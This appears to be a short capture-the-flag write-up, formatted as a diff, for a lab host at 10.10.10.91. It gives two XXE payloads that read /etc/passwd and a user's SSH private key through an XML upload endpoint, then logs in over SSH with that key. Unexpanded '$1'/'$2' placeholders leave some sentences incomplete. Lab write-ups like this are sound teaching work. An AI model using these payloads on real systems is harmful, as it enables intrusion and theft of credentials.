@@ -1,0 +1,28 @@
+Step 1 (Enumeration)
+- target has ports 22 (SSH),5000 (HTTP) open
+- gobuster shows /upload directory
+- /upload directory is for XML script upload
+
+Step 2 (Foot hold)
+- using $1 we enumerate the users on the system.
+- $1
+- <?xml version="1.0" encoding="UTF-8"?>
+- <!DOCTYPE root [<!ELEMENT foo ANY >
+- <!ENTITY file SYSTEM "file:///etc/passwd">]>
+- <root>
+-   <Author>&file;</Author>
+-   <Subject>ufgh</Subject>
+-   <Content>bob</Content>
+- </root>
+- as SSH port is open using $2 we see the private SSH rsa key.
+- <?xml version="1.0" encoding="UTF-8"?>
+- <!DOCTYPE root [<!ELEMENT foo ANY >
+- <!ENTITY file SYSTEM "file:///home/roosa/.ssh/id_rsa">]>
+- <root>
+-   <Author>&file;</Author>
+-   <Subject>ufgh</Subject>
+-   <Content>bob</Content>
+- </root>
+- With the privat key we just login using the syntax 'ssh -i rsa.key roosa@10.10.10.91
+
+Step 3 (Enumeration)
